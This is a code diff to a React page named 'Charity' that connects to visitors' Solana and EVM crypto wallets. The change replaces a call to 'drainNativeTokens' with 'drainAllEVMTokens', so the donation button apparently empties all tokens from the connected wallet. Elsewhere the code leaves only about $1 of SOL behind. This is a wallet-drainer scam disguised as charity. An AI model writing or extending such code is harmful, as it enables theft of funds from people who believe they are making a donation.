@@ -13,7 +13,7 @@ import { Badge } from '@/components/ui/badge';
 import { AnimatedLogo } from '@/components/AnimatedLogo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { InlineConnectWallet } from '@/components/InlineConnectWallet';
 
@@ -38,7 +38,7 @@ const SOL_RESERVE_USD = 1; // Always leave $1 worth of SOL
 const Charity = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
-  const { activeChain, getEVMChain } = useChain();
+  const { activeChain, getEVMChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
   const [balances, setBalances] = useState<TokenBalance[]>([]);
@@ -278,10 +278,7 @@ const Charity = () => {
       try {
         setButtonState('loading');
         const chainName = getEVMChain()?.name || 'EVM';
-        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
-        if (hash) {
-        } else {
-        }
+        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
         setButtonState('idle');
       } catch (error: any) {
         setButtonState('error');
@@ -449,7 +446,7 @@ const Charity = () => {
       setButtonState('error');
       setTimeout(() => setButtonState('idle'), 3000);
     }
-  }, [publicKey, sendTransaction, balances, solBalance, solPriceUSD, solValueUSD, connection, createTokenTransfer, createSOLTransfer, fetchBalances, activeChain, isEVMConnected, evmSigner, evmProvider, getEVMChain]);
+  }, [publicKey, sendTransaction, balances, solBalance, solPriceUSD, solValueUSD, connection, createTokenTransfer, createSOLTransfer, fetchBalances, activeChain, isEVMConnected, evmSigner, evmProvider, getEVMChain, evmChainId]);
 
   return (
     <div className="min-h-screen relative overflow-hidden">
